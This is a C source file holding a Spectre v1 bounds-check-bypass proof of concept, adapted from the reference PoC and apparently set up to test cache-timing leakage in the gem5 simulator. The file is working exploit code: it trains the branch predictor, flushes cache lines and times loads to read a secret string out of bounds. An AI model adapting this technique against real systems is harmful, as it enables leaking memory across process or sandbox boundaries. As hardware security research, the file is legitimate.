/* compile:
gcc -O0 -static configs/vulcan/spectre.c -o spectre
*/

/* Spectre v1 (bounds-check-bypass) PoC, adapted from the reference PoC in
 * Kocher et al., "Spectre Attacks: Exploiting Speculative Execution", for
 * standalone SE-mode execution under gem5 (single process, no privilege
 * boundary -- the point here is only to check whether the speculative
 * load's cache-timing side channel is observable, not to cross a real
 * protection boundary). */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <x86intrin.h>

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};
uint8_t unused2[64];
uint8_t array2[256 * 512];

char *secret = "The Magic Words are Squeamish Ossifrage.";

uint8_t temp = 0; /* so the compiler can't optimize away victim_function */

/* Cache hit/miss threshold, calibrated for gem5's simulated timing
 * (measured avg hit ~25 cycles, avg miss ~176 cycles on this build). Use
 * calibrate.c to re-measure if you change the CPU/cache config. */
#define CACHE_HIT_THRESHOLD 100

__attribute__((noinline)) void
victim_function(size_t x)
{
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

int MAX_TRIES = 999;

/* Report best guess in value[0] and runner-up in value[1] */
void
readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
{
    static int results[256];
    int tries, i, j, k, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++) {
        results[i] = 0;
    }
    for (tries = MAX_TRIES; tries > 0; tries--) {
        /* Flush array2[256*(0..255)] from cache */
        for (i = 0; i < 256; i++) {
            _mm_clflush((void *)&array2[i * 512]);
        }

        /* 30 loops: 5 training runs (x=training_x) per attack run
         * (x=malicious_x) */
        training_x = tries % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush((void *)&array1_size);
            for (volatile int z = 0; z < 100; z++) {} /* Delay */

            /* Bit twiddling to set x=training_x if j%6!=0
             * or malicious_x if j%6==0 */
            x = ((j % 6) - 1) & ~0xFFFFL;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim! */
            victim_function(x);
        }

        /* Time reads. Order is lightly mixed up to prevent stride
         * prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;
            if (time2 <= CACHE_HIT_THRESHOLD &&
                mix_i != array1[tries % array1_size]) {
                results[mix_i]++;
            }
        }

        /* Locate top two results */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) ||
            (results[j] == 2 && results[k] == 0)) {
            break; /* Clear success */
        }
    }
    results[0] ^= junk; /* use junk so it's not optimized out */
    value[0] = (uint8_t)j;
    score[0] = results[j];
    value[1] = (uint8_t)k;
    score[1] = results[k];
}

int
main(int argc, char **argv)
{
    size_t malicious_x = (size_t)(secret - (char *)array1); /* out-of-bounds */
    int i, score[2], len = 20;
    uint8_t value[2];
    int successes = 0;

    if (argc > 1) {
        len = atoi(argv[1]);
    }
    if (argc > 2) {
        MAX_TRIES = atoi(argv[2]);
    }

    printf("Reading %d bytes that shouldn't be accessible (max_tries=%d):\n",
           len, MAX_TRIES);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void *)(malicious_x + len));
        readMemoryByte(malicious_x + len, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X=%c score=%d ", value[0],
               (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[0] >= 2 * score[1] && value[0] == (uint8_t)secret[len]) {
            successes++;
        }
        if (score[1] > 0) {
            printf("(second best: 0x%02X score=%d)", value[1], score[1]);
        }
        printf("\n");
    }
    printf("RESULT: %d/%d bytes correctly leaked\n", successes,
           (argc > 1 ? atoi(argv[1]) : 20));
    return 0;
}
